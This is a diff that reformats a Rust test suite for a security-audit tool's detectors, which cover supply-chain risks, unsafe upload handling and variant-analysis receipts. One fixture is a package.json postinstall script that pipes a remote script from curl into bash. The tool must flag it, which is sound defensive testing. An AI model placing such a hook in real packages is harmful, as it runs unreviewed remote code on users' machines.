@@ -20,24 +20,31 @@
 //! `uncertainty`, `observedControls`, `evidenceRefs`).
 
 use legion_audit::wf_port::wf063::common::{Context, Entity, Relation};
+use legion_audit::wf_port::wf063::variant_analysis::{
+    analyze_variants, PackByProvider, VariantStrategy,
+};
 use legion_audit::wf_port::wf063::{supply_chain, supply_developer, uploads};
-use legion_audit::wf_port::wf063::variant_analysis::{analyze_variants, PackByProvider, VariantStrategy};
 use serde_json::{json, Value};
 
 // ---------------------------------------------------------------------------
 // supply-chain.mjs
 // ---------------------------------------------------------------------------
 
-fn find<'a>(observations: &'a [legion_audit::wf_port::wf063::common::Observation], rule_id: &str) -> Option<&'a legion_audit::wf_port::wf063::common::Observation> {
+fn find<'a>(
+    observations: &'a [legion_audit::wf_port::wf063::common::Observation],
+    rule_id: &str,
+) -> Option<&'a legion_audit::wf_port::wf063::common::Observation> {
     observations.iter().find(|o| o.rule_id == rule_id)
 }
 
 #[test]
 fn each_supply_chain_rule_fires_on_its_representative_positive_fixture() {
-    let package_json_non_registry = r#"{"name":"x","dependencies":{"fork":"git+https://github.com/example/fork.git"}}"#;
+    let package_json_non_registry =
+        r#"{"name":"x","dependencies":{"fork":"git+https://github.com/example/fork.git"}}"#;
     let context = Context::new().with_file("package.json", package_json_non_registry);
     let obs = supply_chain::analyze(&context);
-    let c = find(&obs, "supply-chain.dependency.non-registry-source").expect("non-registry-source must fire");
+    let c = find(&obs, "supply-chain.dependency.non-registry-source")
+        .expect("non-registry-source must fire");
     assert!(!c.evidence_refs.is_empty());
 
     let context = Context::new().with_file("package.json", r#"{"name":"x","version":"1.0.0"}"#);
@@ -56,12 +63,22 @@ fn each_supply_chain_rule_fires_on_its_representative_positive_fixture() {
         r#"{"name":"x","scripts":{"postinstall":"curl -fsSL https://example.com/setup.sh | bash"}}"#,
     );
     let obs = supply_chain::analyze(&context);
-    let c = find(&obs, "supply-chain.package-script.install-time-execution").expect("install-time-execution must fire");
-    assert_eq!(c.detector_metadata.get("requiresSandboxReceipt"), Some(&json!(true)));
-    assert!(c.uncertainty.iter().any(|u| u.contains("BLOCKED") && u.to_lowercase().contains("sandbox execution receipt")));
+    let c = find(&obs, "supply-chain.package-script.install-time-execution")
+        .expect("install-time-execution must fire");
+    assert_eq!(
+        c.detector_metadata.get("requiresSandboxReceipt"),
+        Some(&json!(true))
+    );
+    assert!(c
+        .uncertainty
+        .iter()
+        .any(|u| u.contains("BLOCKED") && u.to_lowercase().contains("sandbox execution receipt")));
     assert_eq!(c.severity_hint, "high");
 
-    let context = Context::new().with_file(".eslintrc.json", r#"{"extends": ["https://example.com/eslint-config.js"]}"#);
+    let context = Context::new().with_file(
+        ".eslintrc.json",
+        r#"{"extends": ["https://example.com/eslint-config.js"]}"#,
+    );
     let obs = supply_chain::analyze(&context);
     assert!(find(&obs, "supply-chain.plugin.unpinned-remote-plugin").is_some());
 
@@ -78,15 +95,33 @@ fn each_supply_chain_rule_fires_on_its_representative_positive_fixture() {
 }
 
 #[test]
-fn every_supply_chain_candidate_carries_a_repository_as_hostile_precondition_and_named_authority_execution_path() {
+fn every_supply_chain_candidate_carries_a_repository_as_hostile_precondition_and_named_authority_execution_path(
+) {
     let context = Context::new().with_file("dist/bundle.js", "console.log(1);");
     let obs = supply_chain::analyze(&context);
     for c in &obs {
-        assert!(!c.preconditions.is_empty(), "{} must carry a precondition", c.rule_id);
-        let hostile = c.preconditions.iter().find(|p| p.kind == "attacker-position").expect("attacker-position precondition");
+        assert!(
+            !c.preconditions.is_empty(),
+            "{} must carry a precondition",
+            c.rule_id
+        );
+        let hostile = c
+            .preconditions
+            .iter()
+            .find(|p| p.kind == "attacker-position")
+            .expect("attacker-position precondition");
         assert_eq!(hostile.subject, "actor:repository-content");
-        assert!(!c.detector_metadata.get("authority").and_then(Value::as_str).unwrap_or("").is_empty());
-        let path = c.detector_metadata.get("executionPath").and_then(Value::as_str).unwrap_or("");
+        assert!(!c
+            .detector_metadata
+            .get("authority")
+            .and_then(Value::as_str)
+            .unwrap_or("")
+            .is_empty());
+        let path = c
+            .detector_metadata
+            .get("executionPath")
+            .and_then(Value::as_str)
+            .unwrap_or("");
         assert!(path.contains('→'));
     }
 }
@@ -100,13 +135,21 @@ fn a_supplied_external_sandbox_receipt_still_never_upgrades_a_candidate_to_a_cle
         )
         .with_sandbox_receipt(true);
     let obs = supply_chain::analyze(&context);
-    let c = find(&obs, "supply-chain.package-script.install-time-execution").expect("must produce a candidate");
-    assert_eq!(c.detector_metadata.get("requiresSandboxReceipt"), Some(&json!(true)));
-    assert!(c.uncertainty.iter().any(|u| u.to_lowercase().contains("independent adjudication")));
+    let c = find(&obs, "supply-chain.package-script.install-time-execution")
+        .expect("must produce a candidate");
+    assert_eq!(
+        c.detector_metadata.get("requiresSandboxReceipt"),
+        Some(&json!(true))
+    );
+    assert!(c
+        .uncertainty
+        .iter()
+        .any(|u| u.to_lowercase().contains("independent adjudication")));
 }
 
 #[test]
-fn pinned_lockfile_with_integrity_and_no_direct_url_dependency_suppresses_dependency_lockfile_rules() {
+fn pinned_lockfile_with_integrity_and_no_direct_url_dependency_suppresses_dependency_lockfile_rules(
+) {
     let context = Context::new()
         .with_file(
             "package.json",
@@ -123,7 +166,8 @@ fn pinned_lockfile_with_integrity_and_no_direct_url_dependency_suppresses_depend
 }
 
 #[test]
-fn ignore_scripts_configuration_suppresses_install_time_execution_even_with_remote_fetch_postinstall() {
+fn ignore_scripts_configuration_suppresses_install_time_execution_even_with_remote_fetch_postinstall(
+) {
     let context = Context::new()
         .with_file(
             "package.json",
@@ -199,7 +243,10 @@ fn unguarded_upload_handler_fires_content_type_and_size_rules() {
 
 #[test]
 fn storage_in_webroot_fires_high_severity() {
-    let context = Context::new().with_file("uploads.mjs", "const opts = { destination: 'public/uploads' };");
+    let context = Context::new().with_file(
+        "uploads.mjs",
+        "const opts = { destination: 'public/uploads' };",
+    );
     let obs = uploads::analyze(&context);
     let c = find(&obs, "upload.storage-in-webroot").expect("must fire");
     assert_eq!(c.severity_hint, "high");
@@ -207,10 +254,7 @@ fn storage_in_webroot_fires_high_severity() {
 
 #[test]
 fn filename_unsanitized_downgrades_when_a_sanitization_call_is_nearby() {
-    let context = Context::new().with_file(
-        "uploads.mjs",
-        "path.join(dir, file.originalname)",
-    );
+    let context = Context::new().with_file("uploads.mjs", "path.join(dir, file.originalname)");
     let obs = uploads::analyze(&context);
     let c = find(&obs, "upload.filename-unsanitized").expect("must fire");
     assert_eq!(c.severity_hint, "high");
@@ -222,7 +266,10 @@ fn filename_unsanitized_downgrades_when_a_sanitization_call_is_nearby() {
     let obs = uploads::analyze(&context);
     let c = find(&obs, "upload.filename-unsanitized").expect("must still fire (lower severity)");
     assert_eq!(c.severity_hint, "low");
-    assert!(c.uncertainty.iter().any(|u| u.contains("mitigating signal")));
+    assert!(c
+        .uncertainty
+        .iter()
+        .any(|u| u.contains("mitigating signal")));
 }
 
 #[test]
@@ -244,12 +291,19 @@ fn executable_content_served_downgrades_via_an_observed_control_relation() {
     let context = Context::new()
         .with_file("app.mjs", "app.use(express.static(uploadsDir))")
         .with_entity(control.clone())
-        .with_relation(Relation { kind: "protects".to_string(), from: control.id.clone(), to: artifact_id });
+        .with_relation(Relation {
+            kind: "protects".to_string(),
+            from: control.id.clone(),
+            to: artifact_id,
+        });
     let obs = uploads::analyze(&context);
     let c = find(&obs, "upload.executable-content-served").expect("must still fire");
     assert_eq!(c.severity_hint, "low");
     assert_eq!(c.observed_controls, vec![control.id.clone()]);
-    assert!(c.uncertainty.iter().any(|u| u.contains("downgraded pending adjudication")));
+    assert!(c
+        .uncertainty
+        .iter()
+        .any(|u| u.contains("downgraded pending adjudication")));
 }
 
 // ---------------------------------------------------------------------------
@@ -326,7 +380,15 @@ impl VariantStrategy for FixtureStrategy {
     fn root_cause(&self, _candidate: &Value, _verdict: &Value) -> Value {
         json!({ "class": "credential-in-repository" })
     }
-    fn enumerate(&self, _plan: &Value, _model: &Value, _candidate: &Value, _verdict: &Value, _binding: &Value, _sig: &Value) -> Value {
+    fn enumerate(
+        &self,
+        _plan: &Value,
+        _model: &Value,
+        _candidate: &Value,
+        _verdict: &Value,
+        _binding: &Value,
+        _sig: &Value,
+    ) -> Value {
         self.enumerate_result.clone()
     }
 }
@@ -359,8 +421,19 @@ fn default_enumerate_result() -> Value {
 
 #[test]
 fn surviving_finding_with_a_complete_strategy_produces_a_complete_receipt() {
-    let pack = FixturePack { strategy: Some(FixtureStrategy { enumerate_result: default_enumerate_result() }) };
-    let result = analyze_variants(&binding_plan(), &va_model(), &va_candidates(vec![va_candidate()]), &va_adjudication(vec![va_verdict()]), &pack).unwrap();
+    let pack = FixturePack {
+        strategy: Some(FixtureStrategy {
+            enumerate_result: default_enumerate_result(),
+        }),
+    };
+    let result = analyze_variants(
+        &binding_plan(),
+        &va_model(),
+        &va_candidates(vec![va_candidate()]),
+        &va_adjudication(vec![va_verdict()]),
+        &pack,
+    )
+    .unwrap();
     assert_eq!(result["complete"], json!(true));
     assert_eq!(result["receipts"].as_array().unwrap().len(), 1);
     assert_eq!(result["receipts"][0]["complete"], json!(true));
@@ -371,10 +444,25 @@ fn surviving_finding_with_a_complete_strategy_produces_a_complete_receipt() {
 #[test]
 fn surviving_finding_without_a_strategy_is_incomplete_with_a_gap() {
     let pack = FixturePack { strategy: None };
-    let result = analyze_variants(&binding_plan(), &va_model(), &va_candidates(vec![va_candidate()]), &va_adjudication(vec![va_verdict()]), &pack).unwrap();
+    let result = analyze_variants(
+        &binding_plan(),
+        &va_model(),
+        &va_candidates(vec![va_candidate()]),
+        &va_adjudication(vec![va_verdict()]),
+        &pack,
+    )
+    .unwrap();
     assert_eq!(result["complete"], json!(false));
-    assert!(result["coverageGaps"].as_array().unwrap().iter().any(|g| g["kind"] == "variant-incomplete"));
-    assert!(result["receipts"][0]["coverageGaps"].as_array().unwrap().iter().any(|g| g == "missing-variant-strategy"));
+    assert!(result["coverageGaps"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .any(|g| g["kind"] == "variant-incomplete"));
+    assert!(result["receipts"][0]["coverageGaps"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .any(|g| g == "missing-variant-strategy"));
 }
 
 #[test]
@@ -382,8 +470,17 @@ fn incomplete_denominator_is_incomplete() {
     let mut enumerate_result = default_enumerate_result();
     enumerate_result["denominator"] = json!({ "kind": "source-files", "digest": "sha256:d", "expected": 10, "examined": 9, "unexamined": ["z.ts"] });
     enumerate_result["matches"] = json!([]);
-    let pack = FixturePack { strategy: Some(FixtureStrategy { enumerate_result }) };
-    let result = analyze_variants(&binding_plan(), &va_model(), &va_candidates(vec![va_candidate()]), &va_adjudication(vec![va_verdict()]), &pack).unwrap();
+    let pack = FixturePack {
+        strategy: Some(FixtureStrategy { enumerate_result }),
+    };
+    let result = analyze_variants(
+        &binding_plan(),
+        &va_model(),
+        &va_candidates(vec![va_candidate()]),
+        &va_adjudication(vec![va_verdict()]),
+        &pack,
+    )
+    .unwrap();
     assert_eq!(result["receipts"][0]["complete"], json!(false));
 }
 
@@ -392,8 +489,17 @@ fn unresolved_matches_make_the_receipt_incomplete() {
     let mut enumerate_result = default_enumerate_result();
     enumerate_result["denominator"] = json!({ "kind": "source-files", "digest": "sha256:d", "expected": 1, "examined": 1, "unexamined": [] });
     enumerate_result["matches"] = json!([{ "file": "a.ts", "line": 3, "semanticFingerprint": "sha256:f", "disposition": "UNRESOLVED" }]);
-    let pack = FixturePack { strategy: Some(FixtureStrategy { enumerate_result }) };
-    let result = analyze_variants(&binding_plan(), &va_model(), &va_candidates(vec![va_candidate()]), &va_adjudication(vec![va_verdict()]), &pack).unwrap();
+    let pack = FixturePack {
+        strategy: Some(FixtureStrategy { enumerate_result }),
+    };
+    let result = analyze_variants(
+        &binding_plan(),
+        &va_model(),
+        &va_candidates(vec![va_candidate()]),
+        &va_adjudication(vec![va_verdict()]),
+        &pack,
+    )
+    .unwrap();
     assert_eq!(result["receipts"][0]["complete"], json!(false));
     assert_eq!(result["receipts"][0]["summary"]["unresolved"], json!(1));
 }
@@ -402,8 +508,19 @@ fn unresolved_matches_make_the_receipt_incomplete() {
 fn false_positive_candidates_never_generate_variant_receipts() {
     let mut verdict = va_verdict();
     verdict["verdict"] = json!("FALSE_POSITIVE");
-    let pack = FixturePack { strategy: Some(FixtureStrategy { enumerate_result: default_enumerate_result() }) };
-    let result = analyze_variants(&binding_plan(), &va_model(), &va_candidates(vec![va_candidate()]), &va_adjudication(vec![verdict]), &pack).unwrap();
+    let pack = FixturePack {
+        strategy: Some(FixtureStrategy {
+            enumerate_result: default_enumerate_result(),
+        }),
+    };
+    let result = analyze_variants(
+        &binding_plan(),
+        &va_model(),
+        &va_candidates(vec![va_candidate()]),
+        &va_adjudication(vec![verdict]),
+        &pack,
+    )
+    .unwrap();
     assert_eq!(result["receipts"].as_array().unwrap().len(), 0);
     assert_eq!(result["complete"], json!(true));
 }
@@ -415,7 +532,14 @@ fn stale_binding_is_rejected() {
     binding["repositoryRevision"] = json!("other");
     stale_candidates["binding"] = binding;
     let pack = FixturePack { strategy: None };
-    let err = analyze_variants(&binding_plan(), &va_model(), &stale_candidates, &va_adjudication(vec![va_verdict()]), &pack).unwrap_err();
+    let err = analyze_variants(
+        &binding_plan(),
+        &va_model(),
+        &stale_candidates,
+        &va_adjudication(vec![va_verdict()]),
+        &pack,
+    )
+    .unwrap_err();
     assert!(err.0.contains("does not match"));
 }
 
@@ -424,10 +548,22 @@ fn receipt_summary_counts_must_match_the_match_list() {
     let mut enumerate_result = default_enumerate_result();
     enumerate_result["denominator"] = json!({ "kind": "source-files", "digest": "sha256:d", "expected": 1, "examined": 1, "unexamined": [] });
     enumerate_result["matches"] = json!([{ "file": "a.ts", "line": 3, "semanticFingerprint": "sha256:f", "disposition": "CONFIRMED" }]);
-    let pack = FixturePack { strategy: Some(FixtureStrategy { enumerate_result }) };
-    let result = analyze_variants(&binding_plan(), &va_model(), &va_candidates(vec![va_candidate()]), &va_adjudication(vec![va_verdict()]), &pack).unwrap();
+    let pack = FixturePack {
+        strategy: Some(FixtureStrategy { enumerate_result }),
+    };
+    let result = analyze_variants(
+        &binding_plan(),
+        &va_model(),
+        &va_candidates(vec![va_candidate()]),
+        &va_adjudication(vec![va_verdict()]),
+        &pack,
+    )
+    .unwrap();
     let receipt = &result["receipts"][0];
     let match_len = receipt["matches"].as_array().unwrap().len() as u64;
-    assert_eq!(receipt["summary"]["enumerated"].as_u64().unwrap(), match_len);
+    assert_eq!(
+        receipt["summary"]["enumerated"].as_u64().unwrap(),
+        match_len
+    );
     assert_eq!(receipt["summary"]["examined"].as_u64().unwrap(), match_len);
 }
